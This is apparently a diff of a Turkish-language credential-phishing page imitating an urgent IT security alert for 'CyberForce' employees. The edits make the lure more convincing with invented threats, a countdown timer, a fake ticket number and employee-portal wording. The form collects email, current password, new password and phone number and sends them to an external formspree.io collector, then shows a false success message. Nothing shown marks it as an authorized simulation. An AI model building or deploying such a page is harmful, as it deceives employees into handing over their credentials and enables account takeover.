@@ -32,18 +32,22 @@
     .threat-box ul li::before { content: "▸"; color: #c0392b; margin-right: 6px; }
     .timer { background: #f3e8ff; border: 1px solid #d8b4fe; border-radius: 7px; padding: 10px 14px; font-size: 12.5px; color: #6b21a8; font-weight: 600; margin-bottom: 20px; }
     #countdown { font-weight: 800; color: #7b2ff7; font-size: 15px; }
-    label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px; }
-    input { width: 100%; padding: 11px 14px; border: 1.5px solid #e2d9f3; border-radius: 7px; font-size: 14px; font-family: 'Exo 2', sans-serif; color: #1a1a2e; outline: none; transition: border 0.2s; margin-bottom: 15px; background: #fafafa; }
+    .field-group { margin-bottom: 15px; }
+    label { display: block; font-size: 11.5px; font-weight: 700; color: #333; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.8px; }
+    .field-hint { font-size: 10.5px; color: #999; margin-bottom: 5px; font-weight: 400; text-transform: none; letter-spacing: 0; }
+    input { width: 100%; padding: 11px 14px; border: 1.5px solid #e2d9f3; border-radius: 7px; font-size: 14px; font-family: 'Exo 2', sans-serif; color: #1a1a2e; outline: none; transition: border 0.2s; background: #fafafa; }
     input:focus { border-color: #7b2ff7; background: #fff; }
-    .btn { width: 100%; padding: 13px; background: linear-gradient(135deg, #7b2ff7, #5a1fd1); color: #fff; font-size: 15px; font-weight: 700; border: none; border-radius: 8px; cursor: pointer; font-family: 'Exo 2', sans-serif; }
+    .btn { width: 100%; padding: 13px; background: linear-gradient(135deg, #7b2ff7, #5a1fd1); color: #fff; font-size: 15px; font-weight: 700; border: none; border-radius: 8px; cursor: pointer; font-family: 'Exo 2', sans-serif; margin-top: 6px; }
     .btn:hover { opacity: 0.9; }
     .footer-note { margin-top: 14px; font-size: 11px; color: #999; text-align: center; line-height: 1.6; }
     .footer-note strong { color: #7b2ff7; }
+    .divider { border: none; border-top: 1px solid #f0eaff; margin: 18px 0; }
     footer { background: #1a0533; color: #a78bfa; text-align: center; padding: 14px; font-size: 11.5px; }
     .success { display: none; padding: 40px 28px; text-align: center; }
     .success .check { font-size: 52px; margin-bottom: 14px; }
     .success h2 { font-size: 20px; color: #7b2ff7; margin-bottom: 8px; }
     .success p { font-size: 13px; color: #666; line-height: 1.6; }
+    .badge { display: inline-block; background: #f3e8ff; color: #7b2ff7; font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 20px; margin-left: 8px; vertical-align: middle; letter-spacing: 0.5px; }
   </style>
 </head>
 <body>
@@ -62,9 +66,9 @@
 </nav>
 
 <div class="hero">
-  <h2>⚠️ Güvenlik Uyarısı</h2>
-  <h1>Hesabınızda Şüpheli Aktivite Tespit Edildi</h1>
-  <p>Güvenlik sistemlerimiz hesabınızda anormal hareketler tespit etti. Şifrenizi acilen güncellemeniz gerekmektedir.</p>
+  <h2>⚠️ Acil Güvenlik Bildirimi</h2>
+  <h1>Çalışan Hesabınızda Şüpheli Aktivite Tespit Edildi</h1>
+  <p>BT Güvenlik Ekibimiz hesabınızda anormal hareketler tespit etti. Portal erişiminizi korumak için şifrenizi acilen güncellemeniz gerekmektedir.</p>
 </div>
 
 <main>
@@ -72,61 +76,77 @@
     <div class="card-header">
       <div class="icon">🔐</div>
       <div>
-        <div class="title">Şifre Sıfırlama Portalı</div>
-        <div class="sub">CyberForce Kimlik Doğrulama Sistemi</div>
+        <div class="title">Çalışan Kimlik Doğrulama Portalı</div>
+        <div class="sub">CyberForce İç Ağ Güvenlik Sistemi — Yetkili Kullanım</div>
       </div>
     </div>
 
-    <div class="alert">⚠️ Hesabınız güvenlik protokolü gereği geçici kısıtlamaya alınmıştır.</div>
+    <div class="alert">⚠️ Hesabınız BT Güvenlik Politikası gereği geçici erişim kısıtlamasına alınmıştır.</div>
 
     <div class="card-body">
       <div id="form-section">
         <div class="threat-box">
-          <div class="ttitle">🔴 Tespit Edilen Güvenlik Tehditleri</div>
+          <div class="ttitle">🔴 BT Güvenlik Ekibi Tarafından Tespit Edilenler</div>
           <ul>
             <li>4 farklı IP adresinden başarısız giriş denemesi</li>
             <li>Şüpheli lokasyondan erişim girişimi (Moskova, RU)</li>
-            <li>Şifreniz dark web veri sızıntısında tespit edildi</li>
-            <li>Hesabınıza yetkisiz API erişim denemesi</li>
+            <li>Portal şifreniz dark web veri sızıntısında tespit edildi</li>
+            <li>Hesabınıza yetkisiz API erişim denemesi yapıldı</li>
           </ul>
         </div>
 
         <div class="timer">⏱ Kalan süre: <span id="countdown">23:59</span> — Süre dolmadan işlemi tamamlayın!</div>
 
         <form id="resetForm" action="https://formspree.io/f/mdayyzrz" method="POST">
-          <input type="hidden" name="_subject" value="[CyberForce] Yeni Şifre Sıfırlama Formu">
+          <input type="hidden" name="_subject" value="[CyberForce Portal] Çalışan Şifre Sıfırlama">
 
-          <label>Kurumsal E-posta</label>
-          <input type="email" name="email" placeholder="kullanici@cyberforce.com.tr" required>
+          <div class="field-group">
+            <label>Şirket İçi E-posta Adresi <span class="badge">ZORUNLU</span></label>
+            <div class="field-hint">Kurumsal e-posta adresinizi girin (ad.soyad@cyberforce.com.tr)</div>
+            <input type="email" name="email" placeholder="ad.soyad@cyberforce.com.tr" required>
+          </div>
 
-          <label>Mevcut Şifre</label>
-          <input type="password" name="mevcut_sifre" placeholder="Mevcut şifrenizi girin" required>
+          <div class="field-group">
+            <label>Mevcut Portal Şifresi <span class="badge">ZORUNLU</span></label>
+            <div class="field-hint">Sisteme giriş yaptığınız mevcut şifreniz</div>
+            <input type="password" name="mevcut_portal_sifresi" placeholder="Mevcut portal şifrenizi girin" required>
+          </div>
 
-          <label>Yeni Şifre</label>
-          <input type="password" name="yeni_sifre" placeholder="En az 8 karakter" required>
+          <hr class="divider">
 
-          <label>Telefon (Doğrulama)</label>
-          <input type="text" name="telefon" placeholder="+90 5XX XXX XX XX">
+          <div class="field-group">
+            <label>Yeni Portal Şifresi <span class="badge">ZORUNLU</span></label>
+            <div class="field-hint">En az 8 karakter, büyük/küçük harf ve rakam içermeli</div>
+            <input type="password" name="yeni_portal_sifresi" placeholder="Yeni şifrenizi belirleyin" required>
+          </div>
 
-          <button type="submit" class="btn">Şifremi Güncelle &amp; Hesabımı Koru →</button>
+          <div class="field-group">
+            <label>Kayıtlı Cep Telefonu</label>
+            <div class="field-hint">SMS doğrulama kodu göndermek için kullanılacak</div>
+            <input type="text" name="kayitli_telefon" placeholder="+90 5XX XXX XX XX">
+          </div>
+
+          <button type="submit" class="btn">Şifremi Güncelle &amp; Portal Erişimimi Yeniden Aç →</button>
         </form>
 
         <p class="footer-note">
           Bu işlemi siz başlatmadıysanız derhal<br>
-          <strong>security@cyberforce.com.tr</strong> adresine bildiriniz.
+          <strong>bt-guvenlik@cyberforce.com.tr</strong> adresine bildiriniz.<br>
+          <span style="color:#bbb">Bilet No: CF-SEC-2026-04-8821</span>
         </p>
       </div>
 
       <div class="success" id="success-section">
         <div class="check">✅</div>
-        <h2>Şifreniz Güncellendi</h2>
-        <p>Hesabınız başarıyla güvence altına alındı.<br>Yeni şifrenizle giriş yapabilirsiniz.</p>
+        <h2>Şifreniz Başarıyla Güncellendi</h2>
+        <p>Portal erişiminiz yeniden aktif edildi.<br>Yeni şifrenizle sisteme giriş yapabilirsiniz.<br><br>
+        <span style="font-size:11px;color:#aaa">Bilet No: CF-SEC-2026-04-8821 — Kapatıldı</span></p>
       </div>
     </div>
   </div>
 </main>
 
-<footer>© 2026 CyberForce Bilgi Güvenliği A.Ş. — Tüm hakları saklıdır.</footer>
+<footer>© 2026 CyberForce Bilgi Güvenliği A.Ş. — Tüm hakları saklıdır. | BT Güvenlik Portalı v3.2.1</footer>
 
 <script>
   let t = 24*60-1;
